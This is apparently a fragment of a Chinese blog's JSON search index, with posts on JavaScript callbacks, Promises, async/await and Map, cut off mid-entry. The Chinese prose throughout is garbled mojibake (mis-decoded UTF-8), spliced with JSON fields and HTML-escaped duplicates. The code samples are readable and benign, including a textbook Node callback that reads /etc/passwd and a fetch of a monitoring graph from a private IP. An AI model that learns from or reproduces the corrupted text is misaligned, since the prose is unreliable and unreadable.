æœ‰ä¸€ä¸ªä»»åŠ¡æ˜¯è¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ ä»»åŠ¡çš„ç¬¬ä¸€æ®µæ˜¯å‘æ“ä½œç³»ç»Ÿå‘å‡ºè¯·æ±‚ï¼Œ è¦æ±‚è¯»å–æ–‡ä»¶ã€‚ ç„¶åï¼Œ ç¨‹åºæ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›æ–‡ä»¶ï¼Œå†æ¥ç€æ‰§è¡Œä»»åŠ¡çš„ç¬¬äºŒæ®µï¼ˆ å¤„ç†æ–‡ä»¶ï¼‰ã€‚ è¿™ç§ä¸è¿ç»­çš„æ‰§è¡Œï¼Œ å°±å«åšå¼‚æ­¥ã€‚\nç›¸åº”åœ°ï¼Œ è¿ç»­çš„æ‰§è¡Œå°±å«åšåŒæ­¥ã€‚ ç”±äºæ˜¯è¿ç»­æ‰§è¡Œï¼Œ ä¸èƒ½æ’å…¥å…¶ä»–ä»»åŠ¡ï¼Œ æ‰€ä»¥æ“ä½œç³»ç»Ÿä»ç¡¬ç›˜è¯»å–æ–‡ä»¶çš„è¿™æ®µæ—¶é—´ï¼Œ ç¨‹åºåªèƒ½å¹²ç­‰ç€ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚\n2. å›è°ƒå‡½æ•°\njavascript è¯­è¨€å¯¹å¼‚æ­¥ç¼–ç¨‹çš„å®ç°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ã€‚ æ‰€è°“å›è°ƒå‡½æ•°ï¼Œ å°±æ˜¯æŠŠä»»åŠ¡çš„ç¬¬äºŒæ®µå•ç‹¬å†™åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œ ç­‰åˆ°å‡†å¤‡å¥½äº†ï¼Œç»§ç»­æ‰§è¡Œçš„æ—¶å€™ï¼Œ å°±ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ å®ƒçš„è‹±è¯­åå­— callbackï¼Œ ç›´è¯‘è¿‡æ¥å°±æ˜¯ \u0026quot; å›è°ƒ \u0026ldquo;ã€‚\nè¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ æ˜¯è¿™æ ·çš„ï¼Œreadfile æ˜¯å¼‚æ­¥çš„ï¼ŒreadfileSync æ˜¯åŒæ­¥çš„ã€‚\nfs.readfile(\u0026#39;/etc/passwd\u0026#39;, function(err, data) { if(err) throw err; console.log(data); }); ä¸Šé¢ä»£ç ä¸­ï¼Œ readfile å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ï¼Œ ä¹Ÿå°±æ˜¯ä»»åŠ¡çš„ç¬¬äºŒæ®µã€‚ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›äº† / etc / passwdè¿™ä¸ªæ–‡ä»¶ä»¥åï¼Œ å›è°ƒå‡½æ•°æ‰ä¼šæ‰§è¡Œã€‚\n==ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜æ˜¯ï¼Œ ä¸ºä»€ä¹ˆ node.js çº¦å®šï¼Œ å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ å¿…é¡»æ˜¯é”™è¯¯å¯¹è±¡ errï¼ˆ å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œ è¯¥å‚æ•°å°±æ˜¯ nullï¼‰ï¼Ÿ åŸå› æ˜¯æ‰§è¡Œåˆ†æˆä¸¤æ®µï¼Œ åœ¨è¿™ä¸¤æ®µä¹‹é—´æŠ›å‡ºçš„é”™è¯¯ï¼Œ ç¨‹åºæ— æ³•æ•æ‰ï¼Œ åªèƒ½å½“ä½œå‚æ•°ï¼Œ ä¼ å…¥ç¬¬äºŒæ®µã€‚==\n3. promise\nâ€œæƒ³åƒä¸€ä¸‹ä½ æ˜¯ä¸ªå°å­©ï¼Œä½ å¦ˆå¦ˆ promise æ‰¿è¯ºä½ ä¸‹æ˜ŸæœŸç»™ä½ ä¸€éƒ¨æ–°æ‰‹æœºâ€\nåªæœ‰ä¸‹å‘¨æ¥ä¸´çš„æ—¶å€™ï¼Œä½ æ‰ä¼šçŸ¥é“ä½ çœŸçš„å¾—åˆ°ä¸€éƒ¨æ‰‹æœºï¼Œæˆ–è€…æ˜¯éª—ä½ ç©çš„ã€‚\nè¿™å°±æ˜¯ promise. ä¸€ä¸ª promise æœ‰ä¸‰ç§çŠ¶æ€ï¼š\nPending: å¾…å®šï¼Œä½ ä¸çŸ¥é“ä½ æ˜¯å¦èƒ½å¾—åˆ°ä¸€éƒ¨æ‰‹æœº Resolved: å¦ˆå¦ˆå¾ˆé«˜å…´ï¼Œä½ å¾—åˆ°ä¸€éƒ¨æ‰‹æœº Rejected: å¦ˆå¦ˆä¸é«˜å…´ï¼Œä½ æ²¡æœ‰å¾—åˆ°ä¸€éƒ¨æ‰‹æœº çŠ¶æ€å›¾å¦‚ä¸‹ï¼š\nè¯­æ³•å¾ˆç®€å•ï¼š\n// promise syntax look like this new Promise(function (resolve, reject) { ... } ); å†çœ‹ä¸€ä¸‹ä¸Šé¢é—®é¢˜çš„è§£å†³æ–¹æ³•ï¼š\né¦–å…ˆç¡®å®š Mom çš„çŠ¶æ€æ˜¯ unhappyï¼Œç„¶åå»ºç«‹ä¸€ä¸ª Promise æ¥ç¡®å®šæ˜¯å¦å¾—åˆ°æ‰‹æœºï¼Œæœ€åç”¨ä¸€ä¸ªå‡½æ•° askMom æ¥è°ƒç”¨è¿™ä¸ª Promise\nresolve() ä¸­å¯ä»¥æ”¾ç½®ä¸€ä¸ªå‚æ•°ç”¨äºå‘ä¸‹ä¸€ä¸ª then ä¼ é€’ä¸€ä¸ªå€¼ï¼Œthen ä¸­çš„å‡½æ•°ä¹Ÿå¯ä»¥è¿”å›ä¸€ä¸ªå€¼ä¼ é€’ç»™ thenã€‚ä½†æ˜¯ï¼Œå¦‚æœ then ä¸­è¿”å›çš„æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ª then å°†ç›¸å½“äºå¯¹è¿™ä¸ªè¿”å›çš„ Promise è¿›è¡Œæ“ä½œã€‚\nreject() å‚æ•°ä¸­ä¸€èˆ¬ä¼šä¼ é€’ä¸€ä¸ªå¼‚å¸¸ç»™ä¹‹åçš„ catch å‡½æ•°ç”¨äºå¤„ç†å¼‚å¸¸ã€‚\nä½†æ˜¯è¯·æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š\nresolve å’Œ reject çš„ä½œç”¨åŸŸåªæœ‰èµ·å§‹å‡½æ•°ï¼Œä¸åŒ…æ‹¬ then ä»¥åŠå…¶ä»–åºåˆ—ï¼› resolve å’Œ reject å¹¶ä¸èƒ½å¤Ÿä½¿èµ·å§‹å‡½æ•°åœæ­¢è¿è¡Œï¼Œåˆ«å¿˜äº† returnã€‚ var isMomHappy = false; // Promise var willIGetNewPhone = new Promise( function (resolve, reject) { if (isMomHappy) { var phone = { brand: \u0026#39;Samsung\u0026#39;, color: \u0026#39;black\u0026#39; }; resolve(phone); // resolved } else { var reason = new Error(\u0026#39;mom is not happy\u0026#39;); reject(reason); // rejected } } ); var askMom = function () { willIGetNewPhone .then(function (fulfilled) { // yay, you got a new phone console.log(fulfilled); // output: { brand: \u0026#39;Samsung\u0026#39;, color: \u0026#39;black\u0026#39; } }) .catch(function (error) { // oops, mom didn\u0026#39;t buy it console.log(error.message); // output: \u0026#39;mom is not happy\u0026#39; }); }; askMom(); å¾ˆæœ‰ç‚¹æ„æ€å§ã€‚æŠ½è±¡äº†ï¼Œé‚£å°±å®é™…ç‚¹ã€‚\njavascripts ä¸­çš„ fetch å‡½æ•°å°±æ˜¯åŸºäºPromiseèŒƒå¼çš„ï¼Œpromise çš„ resolves ç»‘åœ¨äº† Response ä¸Šã€‚Promise ç±»æœ‰ .then() .catch() å’Œ .finally() ä¸‰ä¸ªæ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•çš„å‚æ•°éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œ.then() å¯ä»¥å°†å‚æ•°ä¸­çš„å‡½æ•°æ·»åŠ åˆ°å½“å‰ Promise çš„æ­£å¸¸æ‰§è¡Œåºåˆ—ï¼Œ.catch() åˆ™æ˜¯è®¾å®š Promise çš„å¼‚å¸¸å¤„ç†åºåˆ—ï¼Œ.finally() æ˜¯åœ¨ Promise æ‰§è¡Œçš„æœ€åä¸€å®šä¼šæ‰§è¡Œçš„åºåˆ—ã€‚ .then() ä¼ å…¥çš„å‡½æ•°ä¼šæŒ‰é¡ºåºä¾æ¬¡æ‰§è¡Œï¼Œæœ‰ä»»ä½•å¼‚å¸¸éƒ½ä¼šç›´æ¥è·³åˆ° catch åºåˆ—ï¼š\nfetch(\u0026#34;http://192.168.1.6/graph_image_hubot.php?action=view\u0026amp;local_graph_id=13619\u0026amp;rra_id=5\u0026#34;) .then(response =\u0026gt; { if (response.ok) { return response.buffer(); } throw new Error(\u0026#39;Network response was not ok.\u0026#39;); }) .then(buffer =\u0026gt; { const formData = new FormData(); formData.append( \u0026#39;media\u0026#39;, buffer, {filename: \u0026#39;bandwidth.png\u0026#39;, contentType: \u0026#39;image/png\u0026#39; } ); robot.wwork.sendImageMessage(owner, formData); }); ä¸Šé¢çš„ç¨‹åºå®é™…ä¸Šæ˜¯ä» cacti æœåŠ¡å™¨æ‹¿åˆ°ä¸€å¼ æµé‡å›¾ç‰‡ï¼Œç„¶å fetch çš„ç»“æœ anywayï¼Œresponseæ€»æ˜¯æœ‰ä¸œè¥¿çš„ï¼Œéƒ½ä¼šæ˜¯æˆåŠŸçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å†ç”¨ response.ok æ¥åˆ¤æ–­ï¼ŒæˆåŠŸå°±ç»§ç»­å¾—åˆ° buffer æµï¼Œæœ€ç»ˆé€åˆ° hubot ä¸­å»ã€‚ä¸‰ä¸ªè¿‡ç¨‹ç”¨ then ä¸²äº†èµ·æ¥ï¼Œæ¯ä¸€æ­¥éƒ½æˆåŠŸæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥ã€‚\nè¿™æ ·å†™é¿å…äº†å›è°ƒåœ°ç‹±ï¼Œçœ‹èµ·æ¥ä¹Ÿæ¯”è¾ƒèˆ’æœã€‚\né‚£ä»€ä¹ˆæ—¶å€™ç”¨ promise å‘¢ï¼Œå®ƒæ˜¯å¼‚æ­¥çš„ï¼Œæœ‰å¤§IOè¯»å†™ç¡¬ç›˜ã€è¯»å†™ç½‘ç»œçš„æ—¶å€™ç”¨ï¼Œä¸Šé¢æ˜¯è¯»å†™ç½‘ç»œã€‚ä¸‹é¢å†æ¥ä¸€ä¸ªè¯»å†™ç£ç›˜çš„ï¼š\nconst {promise: {readFile, writeFile}} = require(\u0026#39;fs\u0026#39;); (async () =\u0026gt; { let content = await readFile(\u0026#39;./data.txt\u0026#39;, \u0026#39;utf8\u0026#39;); await writeFile(\u0026#39;2.txt\u0026#39;, content, \u0026#39;utf8\u0026#39;); console.log(\u0026#39;ok\u0026#39;); })(); ä¸Šé¢çš„è¯­æ³•æ˜¯ ES7 çš„ï¼Œå®ƒæ›´å°½äº†ä¸€æ­¥ï¼Œé¦–å…ˆå£°æ˜ä¸€ä¸ªåŒ¿åçš„å‡½æ•°æ˜¯ async å¼‚æ­¥çš„ï¼Œç„¶åç”¨awaitæ¥è¿›è¡Œç­‰å¾…ï¼Œå°†è¯»å’Œå†™ä¸¤ä¸ªå¤§æ“ä½œéƒ½æ”¾åˆ° await çš„ä¸€æ­¥æ“ä½œä¸­å»ï¼Œè¿™æ ·ç¨‹åºçœ‹èµ·æ¥å°±å˜æˆåŒæ­¥çš„ä¸€æ­¥æ­¥ç­‰å¾…äº†ã€‚è·Ÿ ES6 çš„ promise æ¯”èµ·æ¥ï¼Œæ›´è¿›äº†ä¸€æ­¥ã€‚\n","permalink":"https://rendoumi.com/posts/20220524-javascripts_promise/","summary":"\u003cp\u003e\u003cstrong\u003eä¸€ã€åŸºæœ¬æ¦‚å¿µ\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e1. å¼‚æ­¥\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæ‰€è°“ \u0026quot; å¼‚æ­¥ \u0026ldquo;ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªä»»åŠ¡åˆ†æˆä¸¤æ®µï¼Œ å…ˆæ‰§è¡Œç¬¬ä¸€æ®µï¼Œ ç„¶åè½¬è€Œæ‰§è¡Œå…¶ä»–ä»»åŠ¡å»ï¼Œ ç­‰åšå¥½äº†å‡†å¤‡ï¼Œ å†å›è¿‡å¤´æ‰§è¡Œç¬¬äºŒæ®µã€‚\u003c/p\u003e\n\u003cp\u003eæ¯”å¦‚ï¼Œ æœ‰ä¸€ä¸ªä»»åŠ¡æ˜¯è¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ ä»»åŠ¡çš„ç¬¬ä¸€æ®µæ˜¯å‘æ“ä½œç³»ç»Ÿå‘å‡ºè¯·æ±‚ï¼Œ è¦æ±‚è¯»å–æ–‡ä»¶ã€‚ ç„¶åï¼Œ ç¨‹åºæ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›æ–‡ä»¶ï¼Œå†æ¥ç€æ‰§è¡Œä»»åŠ¡çš„ç¬¬äºŒæ®µï¼ˆ å¤„ç†æ–‡ä»¶ï¼‰ã€‚ è¿™ç§ä¸è¿ç»­çš„æ‰§è¡Œï¼Œ å°±å«åšå¼‚æ­¥ã€‚\u003c/p\u003e\n\u003cp\u003eç›¸åº”åœ°ï¼Œ è¿ç»­çš„æ‰§è¡Œå°±å«åšåŒæ­¥ã€‚ ç”±äºæ˜¯è¿ç»­æ‰§è¡Œï¼Œ ä¸èƒ½æ’å…¥å…¶ä»–ä»»åŠ¡ï¼Œ æ‰€ä»¥æ“ä½œç³»ç»Ÿä»ç¡¬ç›˜è¯»å–æ–‡ä»¶çš„è¿™æ®µæ—¶é—´ï¼Œ ç¨‹åºåªèƒ½å¹²ç­‰ç€ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e2. å›è°ƒå‡½æ•°\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003ejavascript è¯­è¨€å¯¹å¼‚æ­¥ç¼–ç¨‹çš„å®ç°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ã€‚ æ‰€è°“å›è°ƒå‡½æ•°ï¼Œ å°±æ˜¯æŠŠä»»åŠ¡çš„ç¬¬äºŒæ®µå•ç‹¬å†™åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œ ç­‰åˆ°å‡†å¤‡å¥½äº†ï¼Œç»§ç»­æ‰§è¡Œçš„æ—¶å€™ï¼Œ å°±ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ å®ƒçš„è‹±è¯­åå­— callbackï¼Œ ç›´è¯‘è¿‡æ¥å°±æ˜¯ \u0026quot; å›è°ƒ \u0026ldquo;ã€‚\u003c/p\u003e\n\u003cp\u003eè¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ æ˜¯è¿™æ ·çš„ï¼Œreadfile æ˜¯å¼‚æ­¥çš„ï¼ŒreadfileSync æ˜¯åŒæ­¥çš„ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003efs.readfile(\u0026#39;/etc/passwd\u0026#39;, function(err, data) {\n  if(err) throw err;\n  console.log(data);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eä¸Šé¢ä»£ç ä¸­ï¼Œ readfile å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ï¼Œ ä¹Ÿå°±æ˜¯ä»»åŠ¡çš„ç¬¬äºŒæ®µã€‚ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›äº† / etc / passwdè¿™ä¸ªæ–‡ä»¶ä»¥åï¼Œ å›è°ƒå‡½æ•°æ‰ä¼šæ‰§è¡Œã€‚\u003c/p\u003e\n\u003cp\u003e==ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜æ˜¯ï¼Œ ä¸ºä»€ä¹ˆ node.js çº¦å®šï¼Œ å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ å¿…é¡»æ˜¯é”™è¯¯å¯¹è±¡ errï¼ˆ å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œ è¯¥å‚æ•°å°±æ˜¯ nullï¼‰ï¼Ÿ åŸå› æ˜¯æ‰§è¡Œåˆ†æˆä¸¤æ®µï¼Œ åœ¨è¿™ä¸¤æ®µä¹‹é—´æŠ›å‡ºçš„é”™è¯¯ï¼Œ ç¨‹åºæ— æ³•æ•æ‰ï¼Œ åªèƒ½å½“ä½œå‚æ•°ï¼Œ ä¼ å…¥ç¬¬äºŒæ®µã€‚==\u003c/p\u003e","title":"javascriptsä¸­çš„promise"},{"content":"Javascripts ä¸­çš„ map\nè¯´åˆ°mapï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¾ªç¯çš„è¯ï¼Œä¸åœéå†ï¼Œä¼šæŠŠæ—¶é—´ææˆ O(n)ã€‚å¦‚æœæœ‰mapï¼Œæ—¶é—´å°±å˜æˆäº†O(1)ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›¸å½“æœ‰æ•ˆç‡çš„ã€‚\nmap æ˜¯ ES2015 ä¸­æ–°å¢åŠ çš„ï¼Œæ˜¯ä¸€ç§æ–°çš„ Object ç±»å‹ï¼Œå…è®¸å­˜æ”¾å„ç§ key-value å¯¹ã€‚\nmap æœ€å¤§çš„ç‰¹æ€§æ˜¯ï¼Œkey å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬ object å’Œ functionï¼›å¯ä»¥è°ƒç”¨ size å¾—åˆ° map çš„å¤§å°ï¼›è¿­ä»£çš„æ—¶å€™ï¼Œæ˜¯ä¸¥æ ¼æŒ‰ç…§æ·»åŠ çš„é¡ºåºè¿›è¡Œè¿­ä»£çš„ã€‚\nmap çš„æ–¹æ³•å¦‚ä¸‹ï¼š set, get, size, has, delete, clear:\nlet things = new Map(); const myFunc = () =\u0026gt; \u0026#39;ğŸ•\u0026#39;; things.set(\u0026#39;ğŸš—\u0026#39;, \u0026#39;Car\u0026#39;); things.set(\u0026#39;ğŸ \u0026#39;, \u0026#39;House\u0026#39;); things.set(\u0026#39;âœˆï¸\u0026#39;, \u0026#39;Airplane\u0026#39;); things.set(myFunc, \u0026#39;ğŸ˜„ Key is a function!\u0026#39;); things.size; // 4 things.has(\u0026#39;ğŸš—\u0026#39;); // true things.has(myFunc) // true things.has(() =\u0026gt; \u0026#39;ğŸ•\u0026#39;); // false, not the same reference things.get(myFunc); // \u0026#39;ğŸ˜„ Key is a function!\u0026#39; things.delete(\u0026#39;âœˆï¸\u0026#39;); things.has(\u0026#39;âœˆï¸\u0026#39;); // false things.clear(); things.size; // 0 // setting key-value pairs is chainable things.set(\u0026#39;ğŸ”§\u0026#39;, \u0026#39;Wrench\u0026#39;) .set(\u0026#39;ğŸ¸\u0026#39;, \u0026#39;Guitar\u0026#39;) .set(\u0026#39;ğŸ•¹\u0026#39;, \u0026#39;Joystick\u0026#39;); const myMap = new Map(); // Even another map can be a key things.set(myMap, \u0026#39;Oh gosh!\u0026#39;); things.size; // 4 things.get(myMap); // \u0026#39;Oh gosh!\u0026#39; è¿­ä»£å®ƒçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨ for \u0026hellip; ofï¼Œé¡ºåºæ˜¯ä¸¥æ ¼æŒ‰ç…§ä½ æ’å…¥çš„é¡ºåºæ¥çš„ï¼š\nlet activities = new Map(); activities.set(1, \u0026#39;ğŸ‚\u0026#39;); activities.set(2, \u0026#39;ğŸ\u0026#39;); activities.set(3, \u0026#39;ğŸš£\u0026#39;); activities.set(4, \u0026#39;ğŸ¤¾\u0026#39;); for (let [nb, activity] of activities) { console.log(`Activity ${nb} is ${activity}`); } // Activity 1 is ğŸ‚ // Activity 2 is ğŸ // Activity 3 is ğŸš£ // Activity 4 is ğŸ¤¾ ä¹Ÿå¯ä»¥ç”¨ forEach æ¥è¿­ä»£ï¼Œæ³¨æ„ä¸€ç‚¹å³å¯ï¼ŒforEach çš„ callback å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ valueï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ keyï¼Œè·Ÿ for \u0026hellip; of æ˜¯ç›¸åçš„ï¼š\nactivities.forEach((value, key) =\u0026gt; { console.log(`Activity ${key} is ${value}`); }); ","permalink":"https://rendoumi.com/posts/20220523-javascripts_map/","summary":"\u003cp\u003eJavascripts ä¸­çš„ map\u003c/p\u003e\n\u003cp\u003eè¯´åˆ°mapï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¾ªç¯çš„è¯ï¼Œä¸åœéå†ï¼Œä¼šæŠŠæ—¶é—´ææˆ O(n)ã€‚å¦‚æœæœ‰mapï¼Œæ—¶é—´å°±å˜æˆäº†O(1)ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›¸å½“æœ‰æ•ˆç‡çš„ã€‚\u003c/p\u003e\n\u003cp\u003emap æ˜¯ ES2015 ä¸­æ–°å¢åŠ çš„ï¼Œæ˜¯ä¸€ç§æ–°çš„ Object ç±»å‹ï¼Œå…è®¸å­˜æ”¾å„ç§ key-value å¯¹ã€‚\u003c/p\u003e\n\u003cp\u003emap æœ€å¤§çš„ç‰¹æ€§æ˜¯ï¼Œkey å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬ object å’Œ functionï¼›å¯ä»¥è°ƒç”¨ size å¾—åˆ° map çš„å¤§å°ï¼›è¿­ä»£çš„æ—¶å€™ï¼Œæ˜¯ä¸¥æ ¼æŒ‰ç…§æ·»åŠ çš„é¡ºåºè¿›è¡Œè¿­ä»£çš„ã€‚\u003c/p\u003e\n\u003cp\u003emap çš„æ–¹æ³•å¦‚ä¸‹ï¼š set, get, size, has, delete, clear:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-javascript\" data-lang=\"javascript\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003elet\u003c/span\u003e \u003cspan class=\"nx\"\u003ethings\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kr\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ğŸ•\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸš—\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Car\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸ \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;House\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;âœˆï¸\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Airplane\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ğŸ˜„ Key is a function!\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 4\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;ğŸš—\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"c1\"\u003e// true\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehas\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;ğŸ•\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// false, not the same reference\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003ethings\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003emyFunc\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"c1\"\u003e// \u0026#39;ğŸ˜„ Key is a 